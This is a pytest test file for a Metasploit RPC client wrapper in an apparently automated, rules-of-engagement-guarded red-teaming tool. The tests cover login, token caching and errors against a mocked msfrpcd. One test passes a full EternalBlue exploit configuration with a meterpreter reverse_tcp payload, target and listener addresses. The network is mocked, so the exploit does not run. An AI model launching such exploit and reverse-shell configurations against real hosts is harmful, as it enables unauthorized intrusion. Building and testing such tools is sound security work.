"""Tests for the metasploit RPC tool wrapper (Phase 3, Task 5).

Uses ``pytest-httpx`` (already a dev dep since Phase 0, version pinned to
0.35.0 in ``pyproject.toml``) to mock the msfrpcd HTTP+msgpack API — same
pattern as ``tests/unit/tools/test_nvd.py`` (Phase 2 T4). The brief's Step 1
tests used ``unittest.mock.patch`` on ``httpx.AsyncClient`` directly, but
that approach is fragile across httpx versions and doesn't exercise the
real request/response pipeline. ``pytest-httpx`` intercepts at the
transport layer, so the MsfRpcClient's actual msgpack pack/unpack path
runs end-to-end against a fake msfrpcd.

msgpack wire-format deviation from the brief: the brief's ``mock_response.content
= b"\\x92\\xa3tmp_token"`` is not valid msgpack for ``["tmp_token"]`` — ``\\x92``
is fixarray-len-2 and ``\\xa3`` is fixstr-len-3, so the bytes decode as
``["tmp", b"_token"]`` (with trailing bytes left over). We use
``msgpack.packb(["success", "tmp_token"])`` instead, which matches the real
msfrpcd ``auth.login`` response shape (``["success", "<token>"]``) and lets
the brief's ``token[1]`` extraction logic work as designed.
"""
from __future__ import annotations

import re

import msgpack
import pytest

from autored.config import load_roe
from autored.roe_guard import register_roe
from autored.tools.metasploit import (
    MsfResult,
    MsfRpcClient,
    _reset_client_cache,
    metasploit_rpc,
)

# msfrpcd default URL is ``http://127.0.0.1:55553/api/`` (or
# ``http://localhost:55553/api/`` when the brief's tests use ``host="localhost"``).
# The regex matches any URL containing the port on either hostname. Anchored
# at start by pytest-httpx's ``re.match`` semantics, so the leading ``.*``
# is needed to allow the ``http://`` scheme prefix to match. Same idiom as
# ``tests/unit/tools/test_nvd.py``'s NVD URL matcher.
MSF_URL_PATTERN = re.compile(r".*(?:localhost|127\.0\.0\.1):55553.*")


@pytest.fixture(autouse=True)
def _reset_msf_client_cache():
    """Clear the module-level MsfRpcClient cache between tests.

    I4-partial fix: ``metasploit_rpc`` now shares a cached client across
    calls (so the auth token survives — no re-authentication per call).
    That cache would leak between tests since it's module-level, so we
    reset it autouse before each test in this module.
    """
    _reset_client_cache()
    yield
    _reset_client_cache()


def test_msf_client_init():
    """Default + override constructor values land in the right attrs."""
    client = MsfRpcClient(host="localhost", port=55553, password="test")
    assert client.host == "localhost"
    assert client.port == 55553
    assert client.password == "test"
    assert client.token is None
    assert client.url == "http://localhost:55553/api/"

    # Defaults (matches the ``msfrpcd -P msf -p 55553 -a 127.0.0.1`` startup
    # documented in the brief).
    default_client = MsfRpcClient()
    assert default_client.host == "127.0.0.1"
    assert default_client.port == 55553
    assert default_client.password == "msf"


@pytest.mark.asyncio
async def test_msf_login(httpx_mock):
    """Successful auth.login returns the token and caches it on the client."""
    client = MsfRpcClient(host="localhost", port=55553, password="test")
    # msfrpcd's auth.login returns ``["success", "<token>"]`` on a good
    # password. The brief's login() pulls token[1] from any 2+-element list.
    httpx_mock.add_response(
        url=MSF_URL_PATTERN,
        content=msgpack.packb(["success", "tmp_token"]),
    )
    token = await client.login()
    assert token == "tmp_token"
    assert client.token == "tmp_token"


@pytest.mark.asyncio
async def test_msf_login_failure(httpx_mock):
    """401 from msfrpcd is wrapped into a RuntimeError mentioning the status."""
    client = MsfRpcClient(host="localhost", port=55553, password="wrong")
    httpx_mock.add_response(
        url=MSF_URL_PATTERN,
        status_code=401,
    )
    with pytest.raises(RuntimeError) as exc:
        await client.login()
    msg = str(exc.value).lower()
    assert "login failed" in msg or "401" in str(exc.value)


@pytest.mark.asyncio
async def test_msf_execute_exploit_connection_refused(httpx_mock):
    """Review Focus: Metasploit RPC unreachable returns a clear error.

    msfrpcd down/unreachable → ``httpx.AsyncClient.post`` raises
    ``ConnectionRefusedError`` from the transport layer. The brief's
    ``MsfRpcClient._call`` and ``execute_exploit`` don't swallow transport
    errors, so the exception propagates to the caller — which is what
    ``metasploit_rpc``'s outer try/except catches and re-wraps as
    ``MsfResult(success=False, error=...)``.
    """
    client = MsfRpcClient(host="localhost", port=55553, password="test")
    client.token = "fake_token"  # skip the auth.login gate inside _call

    httpx_mock.add_exception(
        ConnectionRefusedError("Connection refused"),
        url=MSF_URL_PATTERN,
    )

    with pytest.raises(ConnectionRefusedError):
        await client.execute_exploit(
            module="exploit/windows/smb/ms17_010_eternalblue",
            target="10.10.10.40",
            payload="windows/x64/meterpreter/reverse_tcp",
            lhost="10.10.14.5",
            lport=4444,
        )


@pytest.mark.asyncio
async def test_metasploit_rpc_ainvoke_works_with_roe_guard(
    httpx_mock, sandbox_roe_yaml
):
    """Integration test: call the decorated tool end-to-end via ``.ainvoke()``.

    Regression catcher for the decorator-stacking bug (Ruling 1 in the SDD
    ledger): ``@tool`` must be applied OUTERMOST and ``@roe_guard`` INNER,
    or the resulting StructuredTool is not callable via ``.ainvoke({...})``.

    Also verifies that ``metasploit_rpc``'s method-dispatch table routes
    "login" → ``MsfRpcClient.login`` and that the success branch packs the
    token into ``MsfResult.data``.
    """
    roe = load_roe(sandbox_roe_yaml)
    register_roe("msf-int", roe)

    httpx_mock.add_response(
        url=MSF_URL_PATTERN,
        content=msgpack.packb(["success", "session_token"]),
    )

    result = await metasploit_rpc.ainvoke(
        {
            "method": "login",
            "params": {
                "host": "127.0.0.1",
                "port": 55553,
                "password": "msf",
            },
            "engagement_id": "msf-int",
        }
    )

    assert isinstance(result, MsfResult)
    assert result.method == "login"
    assert result.success is True
    assert result.error is None
    assert result.data == {"token": "session_token"}
    assert result.duration_sec >= 0.0


@pytest.mark.asyncio
async def test_metasploit_rpc_unknown_method_returns_error(sandbox_roe_yaml):
    """Unknown RPC method names fall through to the error branch (no httpx)."""
    roe = load_roe(sandbox_roe_yaml)
    register_roe("msf-unknown", roe)

    result = await metasploit_rpc.ainvoke(
        {
            "method": "delete_database",
            "params": {},
            "engagement_id": "msf-unknown",
        }
    )
    assert isinstance(result, MsfResult)
    assert result.success is False
    assert "delete_database" in result.error


@pytest.mark.asyncio
async def test_metasploit_rpc_caches_token_across_calls(
    httpx_mock, sandbox_roe_yaml
):
    """I4-partial fix: ``metasploit_rpc`` reuses the auth token across
    invocations — the ``auth.login`` HTTP request fires exactly once per
    ``(host, port, password)`` triple, not on every call.

    Sequence:
    1. ``method="login"`` → 1 HTTP request (auth.login) → token cached
       on the module-level client.
    2. ``method="list_sessions"`` → reuses the cached client → no
       auth.login HTTP request (only the session.list request fires).

    pytest-httpx fails the test if the ``auth.login`` mock is hit
    twice (no second response registered for it), so the assertion is
    implicit in the mock layer.
    """
    roe = load_roe(sandbox_roe_yaml)
    register_roe("msf-cache", roe)

    # First response: auth.login → ["success", "cached_token"].
    # Second response: session.list → {} (no active sessions).
    httpx_mock.add_response(
        url=MSF_URL_PATTERN,
        content=msgpack.packb(["success", "cached_token"]),
    )
    httpx_mock.add_response(
        url=MSF_URL_PATTERN,
        content=msgpack.packb({}),
    )

    login_result = await metasploit_rpc.ainvoke(
        {
            "method": "login",
            "params": {
                "host": "127.0.0.1",
                "port": 55553,
                "password": "msf",
            },
            "engagement_id": "msf-cache",
        }
    )
    assert login_result.success is True
    assert login_result.data == {"token": "cached_token"}

    sessions_result = await metasploit_rpc.ainvoke(
        {
            "method": "list_sessions",
            "params": {
                "host": "127.0.0.1",
                "port": 55553,
                "password": "msf",
            },
            "engagement_id": "msf-cache",
        }
    )
    assert sessions_result.success is True
    assert sessions_result.data == {"sessions": {}}


@pytest.mark.asyncio
async def test_msf_call_auto_logs_in_when_no_token(httpx_mock):
    """I4-partial fix: ``MsfRpcClient._call`` auto-logins when no token is
    cached AND the method isn't ``auth.login`` — previously this raised
    ``RuntimeError("Not authenticated. Call login() first.")``.

    The auto-login fires exactly once; subsequent calls reuse the
    cached token (only one ``auth.login`` HTTP request, even though
    ``_call("session.list")`` is dispatched after auto-login).
    """
    client = MsfRpcClient(host="localhost", port=55553, password="test")

    # First response: auth.login (auto-login fires).
    # Second response: session.list → {"1": {...}}.
    httpx_mock.add_response(
        url=MSF_URL_PATTERN,
        content=msgpack.packb(["success", "auto_login_token"]),
    )
    httpx_mock.add_response(
        url=MSF_URL_PATTERN,
        content=msgpack.packb({"1": {"info": "session_info"}}),
    )

    # Call _call directly without first calling login() — auto-login
    # should fire inside _call() and cache the token.
    result = await client._call("session.list")
    assert result == {"1": {"info": "session_info"}}
    assert client.token == "auto_login_token"
